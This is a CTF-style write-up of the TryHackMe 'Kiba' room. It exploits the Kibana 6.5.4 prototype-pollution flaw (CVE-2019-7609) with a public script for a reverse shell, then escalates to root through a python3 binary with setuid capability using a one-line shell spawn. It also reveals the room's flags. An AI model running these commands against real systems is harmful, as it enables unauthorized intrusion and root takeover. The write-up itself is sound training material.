---
author: "Shebu"
title: "Kiba: THM"
date: "2023-06-07"
tags: ["kiba", "elastic", "prototype pollution", "CVE-2019-7609"]
cover:
    image: "img/0.png"
    # can also paste direct link from external site
    # ex. https://i.ibb.co/K0HVPBd/paper-mod-profilemode.png
    alt: "<alt text>"
    caption: "<text>"
    relative: false # To use relative path for cover image, used in hugo Page-bundles
---

**Kiba** is a easy rated room from tryhackme where we exploit a prototype pollution vulnerability to gain a user shell  & then escalate our privileges to root by exploiting a python3 binary which has setuid capabilities.

*[Image: header]*

|  **Room** 	| Kiba                                          	|
|:--------------:	|----------------------------------------------------	|
|     **OS**     	| Linux                                              	|
| **Difficulty** 	| Easy                                             	|
|  **Room Link** 	| [https://tryhackme.com/room/kiba](https://tryhackme.com/room/kiba)               	|
|   **Creator**  	| [stuxnet](https://tryhackme.com/p/stuxnet) 	|

## What is the vulnerability that is specific to programming languages with prototype-based inheritance? 

*[Image: header]*

> Vulnerability: Prototype Pollution

## What is the version of visualization dashboard installed in the server?

Go to **Management tab** , there we can find the version of kiba that is running.

*[Image: header]*

> Version: 6.5.4

## What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000 /

A simple google search reveals the **CVE** number.

*[Image: header]*

> CVE ID: CVE-2019-7609

## Compromise the machine and locate user.txt

An python3 exploit for prototype pollution is available on github for  kibana  6.5.4 

- [https://github.com/LandGrey/CVE-2019-7609](https://github.com/LandGrey/CVE-2019-7609)

*Run the Exploit*

```bash
amrita22005client@ubuntu:~/kiba$ python3 exploit.py http://10.10.38.106:5601 10.17.45.3 4444
/home/amrita22005client/kiba/exploit.py:15: DeprecationWarning: The distutils package is deprecated and slated for removal in Python 3.12. Use setuptools or check PEP 632 for potential alternatives
  from distutils.version import StrictVersion
[•] Kibana version identified: 6.5.4
[✓] Version is vulnerable
[✓] Target seems vulnerable
[✓] Exploit completed
[➜] Check your listener on 10.17.45.3:4444
```

We get our reverse shell & also the `user.txt` flag.

```bash
shebut@ubuntu:~/kiba$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.38.106 48624
bash: cannot set terminal process group (945): Inappropriate ioctl for device
bash: no job control in this shell
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kiba@ubuntu:/home/kiba/kibana/bin$ id
id
uid=1000(kiba) gid=1000(kiba) groups=1000(kiba),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare)
kiba@ubuntu:/home/kiba/kibana/bin$ cd ~
cd ~
kiba@ubuntu:/home/kiba$ cat user.txt
cat user.txt
THM{1s_*********_rce}
```

> **Capabilities is a concept that provides a security system that allows "divide" root privileges into different values**

## How would you recursively list all of these capabilities?

Command to list all capabilities: `getcap -r /`

```bash
kiba@ubuntu:/home/kiba/kibana/bin$ getcap -r / 2>/dev/null

/home/kiba/.hackmeplease/python3 = cap_setuid+ep
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
```
Straightaway we can see that python3 has a suspicious path.

We can refer [GTFOBINS](https://gtfobins.github.io/gtfobins/python/#capabilities) to exploit the python binary which has setuid capabilities by runing the command `python -c 'import os; os.setuid(0); os.system("/bin/sh")'`

```bash 
# id
uid=0(root) gid=1000(kiba) groups=1000(kiba),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare)

# cat /root/root.txt
THM{pr1v1lege_escalat1on_us1ng_capab1l1t1es}
```
Now we have our root shell & our `root.txt` flag.